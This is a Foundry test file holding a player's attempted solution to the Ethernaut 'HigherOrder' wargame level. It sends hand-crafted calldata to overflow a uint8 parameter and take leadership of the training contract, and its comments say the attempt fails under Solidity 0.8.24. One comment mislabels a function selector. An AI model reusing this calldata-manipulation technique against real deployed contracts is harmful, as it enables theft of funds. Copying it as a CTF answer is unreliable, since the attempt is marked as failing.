// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {HigherOrder} from "../../src/ethernaut/30_HigherOrder/HigherOrder.sol";
import {HigherOrder_Factory} from "../../src/ethernaut/30_HigherOrder/HigherOrder_Factory.sol";
import {HigherOrder_Attacker} from "./30_HigherOrder_Attacker.sol";

contract HigherOrder_Test is Test {
	address deployer = makeAddr("deployer");
	address player = makeAddr("player");

	HigherOrder_Factory factory;
	HigherOrder instContract;
	
	modifier checkSolvedByPlayer() {
		vm.startPrank(player, player);
		_;
		vm.stopPrank();
		_isSolved();
	}
	
	/**
	 * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
	 */
	function _isSolved() private view {
		if (factory.validateInstance(player)) {
			console.log("\x1b[33m%s\x1b[0m", ">>>>>>>>>>>>>> Congratulations, you have successfully completed the challenge >>>>>>>>>>>>>>");
		} else {
			revert(">>>>>>>>>>>>>> Sorry, you failed the challenge >>>>>>>>>>>>>>");
		}
	}
	
	/**
	 * SETS UP CHALLENGE - DO NOT TOUCH
	 */
	function setUp() public {
		startHoax(deployer);
		
		factory = new HigherOrder_Factory();
		instContract = HigherOrder(payable(factory.createInstance(player)));
		
		vm.stopPrank();
		
		vm.deal(address(player), 101 ether);
	}
	
	function test__Solution_HigherOrder() public checkSolvedByPlayer {
		// CODE YOUR SOLUTION HERE
		// forge test --mt test__Solution_HigherOrder -vv
		
		// calldataload(p) - 从调用数据的 p 字节位置开始加载32个字节的数据。
		
		// higherOrder.registerTreasury(123);
		// 0x211c85ab000000000000000000000000000000000000000000000000000000000000007b
		// 211c85ab ---> Keccak25("flipSwitch(bytes)") 211c85abbbaf9884d77268c011d56de0d4b5e816ac06c84275c1aadd7eab81c5
		// 000000000000000000000000000000000000000000000000000000000000007b
		
		console.log("before higherOrder.treasury()", instContract.treasury());
		
		bytes memory mixedBytes = bytes.concat(
			HigherOrder.registerTreasury.selector,
			bytes32(uint256(1234))
		);
		
		address(instContract).call(mixedBytes);
		instContract.claimLeadership();
		
		console.log("after higherOrder.treasury()", instContract.treasury());
		
		// 在 Solidity 0.8.24 中：
		// 编译器在函数入口强制进行 类型安全校验
		// 即使使用汇编，参数也会被 约束 到声明的类型范围
		// 传递 1234 给 uint8 参数会被 自动截断（无法超过255）
		// 该版本无法成功。
	}
}
